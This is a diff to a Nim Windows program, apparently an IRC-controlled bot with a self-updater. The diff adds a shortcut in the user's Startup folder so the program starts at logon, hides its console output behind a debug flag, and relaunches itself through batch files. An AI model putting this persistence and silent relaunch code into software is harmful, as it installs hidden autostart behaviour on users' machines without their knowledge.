@@ -1,6 +1,6 @@
 import configparser, os, irc, osproc, base64, helper_base64, winim/inc/wininet, winim, random
 
-let current_version* = "1.0.6.5"
+let current_version* = "1.0.6.6"
 
 var
     g_tmp_clean* = false
@@ -66,7 +66,7 @@ proc getProcessIdByName(processName: string): DWORD =
 
                 # Check if the executable file name matches the desired process name
                 if exeName == processName:
-                    echo "memory: process found! [" & exeName & "]"
+                    if g_dbg: echo "memory: process found! [" & exeName & "]"
                     CloseHandle(hProcess)
                     hProcess = 0
                     return processIds[i]
@@ -75,9 +75,57 @@ proc getProcessIdByName(processName: string): DWORD =
             CloseHandle(hProcess)
             hProcess = 0
 
-    echo "memory: no process with that name found"
+    if g_dbg: echo "memory: no process with that name found"
     CloseHandle(hProcess)
     return 0
+
+
+
+
+
+proc createShortcut(targetPath: string, shortcutPath: string) =
+  var shellLink: ptr IShellLink
+  var persistFile: ptr IPersistFile
+  var hr: HRESULT
+
+  hr = CoInitialize(nil)
+  if hr != S_OK and hr != S_FALSE:
+    raise newException(OSError, "Failed to initialize COM")
+
+  hr = CoCreateInstance(
+    addr CLSID_ShellLink, nil, CLSCTX_INPROC_SERVER, addr IID_IShellLink,
+    cast[ptr pointer](addr shellLink)
+  )
+
+  if hr != S_OK:
+    CoUninitialize()
+    raise newException(OSError, "Failed to create shell link")
+
+  shellLink.SetPath(targetPath)
+
+  hr = shellLink.QueryInterface(addr IID_IPersistFile, cast[ptr pointer](addr persistFile))
+  if hr != S_OK:
+    shellLink.Release()
+    CoUninitialize()
+    raise newException(OSError, "Failed to get IPersistFile")
+
+  persistFile.Save(shortcutPath, true)
+  persistFile.Release()
+  shellLink.Release()
+  CoUninitialize()
+
+
+
+
+
+proc updt_createStartupShortcut*() =
+    var 
+        (_, name, _) = splitFile(getAppFilename())
+        startup_fullpath = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" & name & ".lnk"
+    if fileExists(startup_fullpath):
+        removeFile(startup_fullpath)
+    createShortcut(getAppFilename(), startup_fullpath)
+
 
 
 
@@ -118,9 +166,7 @@ proc updt_check*(respond_to_caller:bool = false, iclient:Irc, ievent:IrcEvent):b
         ini_raw:string
 
 
-
     if g_dbg: echo "UPDATER: getting info"
-
 
 
     try:
@@ -233,7 +279,7 @@ proc updt_check*(respond_to_caller:bool = false, iclient:Irc, ievent:IrcEvent):b
                 tmpbat_filename_only = name & ext
                 first = true
                 current_method = 1
-                max_methods = 4
+                max_methods = 2
             while getProcessIdByName(tmpbat_filename_only) == 0:
                 if not first:
                     first = false
@@ -244,13 +290,13 @@ proc updt_check*(respond_to_caller:bool = false, iclient:Irc, ievent:IrcEvent):b
                 ## discard startProcess(tmpbat, args = ["\"" & getAppFilename() & "\"", a_very_random_number]) ## THIS DOES NOT START IT PROPERLY
 
                 case current_method:
+                # of 1:
+                #     discard startProcess("cmd.exe",args = ["/C start /B " & tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number])
+                # of 2:
+                #     discard startProcess(tmpbat, args = ["\"" & getAppFilename() & "\"", a_very_random_number])
                 of 1:
-                    discard startProcess("cmd.exe",args = ["/C start /B " & tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number])
-                of 2:
-                    discard startProcess(tmpbat, args = ["\"" & getAppFilename() & "\"", a_very_random_number])
-                of 3:
                     discard launchProcess(tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number)
-                of 4:
+                of 2:
                     discard execShellCmd("start /B " & tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number)
                 else:
                     echo "This is all just terrible"
